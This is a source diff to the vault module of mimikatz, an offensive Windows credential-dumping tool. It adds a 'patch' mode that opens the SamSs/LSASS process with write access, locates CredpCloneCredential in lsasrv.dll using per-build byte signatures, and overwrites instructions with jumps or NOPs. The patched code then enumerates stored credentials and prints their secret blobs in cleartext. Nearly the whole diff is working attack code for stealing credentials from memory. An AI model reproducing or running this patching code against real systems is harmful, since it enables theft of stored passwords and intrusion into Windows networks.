@@ -190,12 +190,15 @@ void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(co
 
 	if(enumItem8->Identity && (enumItem8->Identity->Type == ElementType_ByteArray))
 	{
+		kprintf(L"\t\tUser            : ");
 		if(kull_m_token_getNameDomainFromSID((PSID) enumItem8->Identity->data.ByteArray.Value, &name, &domain, NULL))
 		{
-			kprintf(L"\t\tUser            : %s\\%s\n", domain, name);
+			kprintf(L"%s\\%s", domain, name);
 			LocalFree(name);
 			LocalFree(domain);
-		} else PRINT_ERROR_AUTO(L"kull_m_token_getNameDomainFromSID");
+		}
+		else kull_m_string_displaySID((PSID) enumItem8->Identity->data.ByteArray.Value);
+		kprintf(L"\n");
 
 		if(pGuidString->guid.Data1 == 0x0b4b8a12b)
 		{
@@ -347,12 +350,39 @@ void kuhl_m_vault_list_descItemData(PVAULT_ITEM_DATA pData)
 	}
 }
 
+#ifdef _M_X64
+BYTE PTRN_WNT5_CredpCloneCredential[]			= {0x8b, 0x47, 0x04, 0x83, 0xf8, 0x01, 0x0f, 0x84};
+BYTE PTRN_WN60_CredpCloneCredential[]			= {0x44, 0x8b, 0xea, 0x41, 0x83, 0xe5, 0x01, 0x75};
+BYTE PTRN_WN62_CredpCloneCredential[]			= {0x44, 0x8b, 0xfa, 0x41, 0x83, 0xe7, 0x01, 0x75};
+BYTE PTRN_WN63_CredpCloneCredential[]			= {0x45, 0x8b, 0xf8, 0x44, 0x23, 0xfa, 0x0f, 0x84};
+BYTE PATC_WNT5_CredpCloneCredentialJmpShort[]	= {0x90, 0xe9};
+BYTE PATC_WN63_CredpCloneCredentialJmpShort[]	= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
+BYTE PATC_WALL_CredpCloneCredentialJmpShort[]	= {0xeb};
 
+KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
+	{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_WNT5_CredpCloneCredential),	PTRN_WNT5_CredpCloneCredential},	{sizeof(PATC_WNT5_CredpCloneCredentialJmpShort),	PATC_WNT5_CredpCloneCredentialJmpShort},	{6}},
+	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WN60_CredpCloneCredential),	PTRN_WN60_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WN62_CredpCloneCredential),	PTRN_WN62_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+	{KULL_M_WIN_BUILD_BLUE,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WN63_CredpCloneCredentialJmpShort),	PATC_WN63_CredpCloneCredentialJmpShort},	{6}},
+};
+#elif defined _M_IX86
+BYTE PTRN_WNT5_CredpCloneCredential[]			= {0x8b, 0x43, 0x04, 0x83, 0xf8, 0x01, 0x74};
+BYTE PTRN_WN60_CredpCloneCredential[]			= {0x89, 0x4d, 0x18, 0x83, 0x65, 0x18, 0x01, 0x75};
+BYTE PTRN_WN62_CredpCloneCredential[]			= {0x89, 0x45, 0xd8, 0x75};
+BYTE PTRN_WN63_CredpCloneCredential[]			= {0x83, 0xe1, 0x01, 0x89, 0x4d, 0xe4, 0x75};
+BYTE PATC_WALL_CredpCloneCredentialJmpShort[]	= {0xeb};
+
+KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
+	{KULL_M_WIN_BUILD_XP,	{sizeof(PTRN_WNT5_CredpCloneCredential),	PTRN_WNT5_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
+	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WN60_CredpCloneCredential),	PTRN_WN60_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
+	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WN62_CredpCloneCredential),	PTRN_WN62_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{3}},
+	{KULL_M_WIN_BUILD_BLUE,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
+};
+#endif
 const PCWCHAR CredTypeToStrings[] = {
 	L"?", L"generic", L"domain_password", L"domain_certificate",
 	L"domain_visible_password", L"generic_certificate", L"domain_extended"
 };
-
 NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 {
 	DWORD credCount, i;
@@ -360,35 +390,74 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 	DWORD flags = 0;
 	UNICODE_STRING creds;
 
-	do
+	SERVICE_STATUS_PROCESS ServiceStatusProcess;
+	PKULL_M_MEMORY_HANDLE hMemory;
+	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleSamSrv;
+	HANDLE hSamSs;
+	KULL_M_MEMORY_ADDRESS aPatternMemory = {NULL, &hLocalMemory}, aPatchMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_SEARCH sMemory;
+	PKULL_M_PATCH_GENERIC CredpCloneCredentialReference;
+	
+	static BOOL isPatching = FALSE;	
+	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
-		if(CredEnumerate(NULL, flags, &credCount, &pCredential))
+		if(CredpCloneCredentialReference = kull_m_patch_getGenericFromBuild(CredpCloneCredentialReferences, sizeof(CredpCloneCredentialReferences) / sizeof(KULL_M_PATCH_GENERIC), MIMIKATZ_NT_BUILD_NUMBER))
 		{
-			for(i = 0; i < credCount; i++)
+			aPatternMemory.address = CredpCloneCredentialReference->Search.Pattern;
+			aPatchMemory.address = CredpCloneCredentialReference->Patch.Pattern;
+			if(kull_m_service_getUniqueForName(L"SamSs", &ServiceStatusProcess))
 			{
-				kprintf(L"TargetName : %s / %s\n"
-					L"UserName   : %s\n"
-					L"Comment    : %s\n"
-					L"Type       : %u - %s\n"
-					L"Credential : ",				
-					pCredential[i]->TargetName ? pCredential[i]->TargetName : L"<NULL>",  pCredential[i]->TargetAlias ? pCredential[i]->TargetAlias : L"<NULL>",
-					pCredential[i]->UserName ? pCredential[i]->UserName : L"<NULL>",
-					pCredential[i]->Comment ? pCredential[i]->Comment : L"<NULL>",
-					pCredential[i]->Type, (pCredential[i]->Type < CRED_TYPE_MAXIMUM) ? CredTypeToStrings[pCredential[i]->Type] : L"? (type > CRED_TYPE_MAXIMUM)"
-					);
-				creds.Buffer = (PWSTR) pCredential[i]->CredentialBlob;
-				creds.Length = creds.MaximumLength = (USHORT) pCredential[i]->CredentialBlobSize;
-				
-				if(kull_m_string_suspectUnicodeString(&creds))
-					kprintf(L"%wZ", &creds);
-				else
-					kull_m_string_wprintf_hex(pCredential[i]->CredentialBlob, pCredential[i]->CredentialBlobSize, 1);
-				kprintf(L"\n\n");
-			}
-			CredFree(pCredential);
+				if(hSamSs = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ServiceStatusProcess.dwProcessId))
+				{
+					if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hSamSs, &hMemory))
+					{
+						if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"lsasrv.dll", &iModuleSamSrv))
+						{
+							sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
+							sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
+							isPatching = TRUE;
+							if(!kull_m_patch(&sMemory, &aPatternMemory, CredpCloneCredentialReference->Search.Length, &aPatchMemory, CredpCloneCredentialReference->Patch.Length, CredpCloneCredentialReference->Offsets.off0, kuhl_m_vault_cred, argc, argv, NULL))
+								PRINT_ERROR_AUTO(L"kull_m_patch");
+							isPatching = FALSE;
+						} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+						kull_m_memory_close(hMemory);
+					}
+				} else PRINT_ERROR_AUTO(L"OpenProcess");
+			} else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
 		}
-		flags++;
-	} while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (MIMIKATZ_NT_MAJOR_VERSION > 5));
+	}
+	else
+	{
+		do
+		{
+			if(CredEnumerate(NULL, flags, &credCount, &pCredential))
+			{
+				for(i = 0; i < credCount; i++)
+				{
+					kprintf(L"TargetName : %s / %s\n"
+						L"UserName   : %s\n"
+						L"Comment    : %s\n"
+						L"Type       : %u - %s\n"
+						L"Credential : ",				
+						pCredential[i]->TargetName ? pCredential[i]->TargetName : L"<NULL>",  pCredential[i]->TargetAlias ? pCredential[i]->TargetAlias : L"<NULL>",
+						pCredential[i]->UserName ? pCredential[i]->UserName : L"<NULL>",
+						pCredential[i]->Comment ? pCredential[i]->Comment : L"<NULL>",
+						pCredential[i]->Type, (pCredential[i]->Type < CRED_TYPE_MAXIMUM) ? CredTypeToStrings[pCredential[i]->Type] : L"? (type > CRED_TYPE_MAXIMUM)"
+						);
+					creds.Buffer = (PWSTR) pCredential[i]->CredentialBlob;
+					creds.Length = creds.MaximumLength = (USHORT) pCredential[i]->CredentialBlobSize;
 
+					if(kull_m_string_suspectUnicodeString(&creds))
+						kprintf(L"%wZ", &creds);
+					else
+						kull_m_string_wprintf_hex(pCredential[i]->CredentialBlob, pCredential[i]->CredentialBlobSize, 1);
+					kprintf(L"\n\n");
+				}
+				CredFree(pCredential);
+			}
+			flags++;
+		} while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (MIMIKATZ_NT_MAJOR_VERSION > 5));
+	}
 	return STATUS_SUCCESS;
 }
